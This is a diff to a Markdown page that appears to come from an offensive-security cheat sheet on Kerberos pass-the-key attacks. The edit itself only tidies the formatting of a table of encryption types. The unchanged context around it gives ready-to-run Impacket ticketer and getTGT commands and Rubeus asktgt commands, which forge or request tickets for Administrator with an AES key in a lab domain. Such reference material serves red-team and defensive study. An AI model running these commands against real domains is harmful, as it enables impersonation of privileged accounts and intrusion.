@@ -12,28 +12,28 @@ Pre-authentication requires the requesting user to provide a secret key, which i
 In the past, there were more encryptions methods, that have now been deprecated.
 
 | enctype                    | weak?| krb5   | Windows |
-| -------------------------- | ---- | ------ | ------- |		
-| des-cbc-crc                | weak	| <1.18	 | >=2000  | 
-| des-cbc-md4                | weak	| <1.18	 | ?       | 
-| des-cbc-md5                | weak	| <1.18	 | >=2000  | 
-| des3-cbc-sha1              | 	 	| >=1.1	 | none    | 
-| arcfour-hmac               | 	 	| >=1.3	 | >=2000  | 
-| arcfour-hmac-exp           | weak	| >=1.3	 | >=2000  | 
-| aes128-cts-hmac-sha1-96    | 	 	| >=1.3	 | >=Vista | 
-| aes256-cts-hmac-sha1-96	 |      | >=1.3	 | >=Vista | 
-| aes128-cts-hmac-sha256-128 | 	 	| >=1.15 | none    | 
-| aes256-cts-hmac-sha384-192 | 	 	| >=1.15 | none    | 
-| camellia128-cts-cmac	 	 |      | >=1.9	 | none    | 
-| camellia256-cts-cmac	 	 |      | >=1.9	 | none    | 
+| -------------------------- | ---- | ------ | ------- |  
+| des-cbc-crc                | weak | <1.18  | >=2000  |
+| des-cbc-md4                | weak | <1.18  | ?       |
+| des-cbc-md5                | weak | <1.18  | >=2000  |
+| des3-cbc-sha1              |    | >=1.1  | none    |
+| arcfour-hmac               |    | >=1.3  | >=2000  |
+| arcfour-hmac-exp           | weak | >=1.3  | >=2000  |
+| aes128-cts-hmac-sha1-96    |    | >=1.3  | >=Vista |
+| aes256-cts-hmac-sha1-96  |      | >=1.3  | >=Vista |
+| aes128-cts-hmac-sha256-128 |    | >=1.15 | none    |
+| aes256-cts-hmac-sha384-192 |    | >=1.15 | none    |
+| camellia128-cts-cmac    |      | >=1.9  | none    |
+| camellia256-cts-cmac    |      | >=1.9  | none    |
 
 Microsoft Windows releases Windows 7 and later disable single-DES enctypes by default.
-
 
 Either use the AES key to generate a ticket with `ticketer`, or request a new TGT using `getTGT.py` script from Impacket.
 
 ## Generate a new ticket
 
 * [fortra/impacket/ticketer.py](https://github.com/fortra/impacket/blob/master/examples/ticketer.py)
+
     ```powershell
     impacket-ticketer -aesKey 2ef70e1ff0d18df08df04f272df3f9f93b707e89bdefb95039cddbadb7c6c574 -domain lab.local Administrator -domain-sid S-1-5-21-2218639424-46377867-3078535060
     ```
@@ -41,16 +41,17 @@ Either use the AES key to generate a ticket with `ticketer`, or request a new TG
 ## Request a TGT
 
 * [fortra/impacket/getTGT.py](https://github.com/fortra/impacket/blob/master/examples/getTGT.py)
+
     ```powershell
     impacket-getTGT -aesKey 2ef70e1ff0d18df08df04f272df3f9f93b707e89bdefb95039cddbadb7c6c574 lab.local
     ```
 
 * [GhostPack/Rubeus](https://github.com/GhostPack/Rubeus)
+
     ```powershell
     .\Rubeus.exe asktgt /user:Administrator /aes128 bc09f84dcb4eabccb981a9f265035a72 /ptt
     .\Rubeus.exe asktgt /user:Administrator /aes256:2ef70e1ff0d18df08df04f272df3f9f93b707e89bdefb95039cddbadb7c6c574 /opsec /ptt
     ```
-
 
 ## References
 
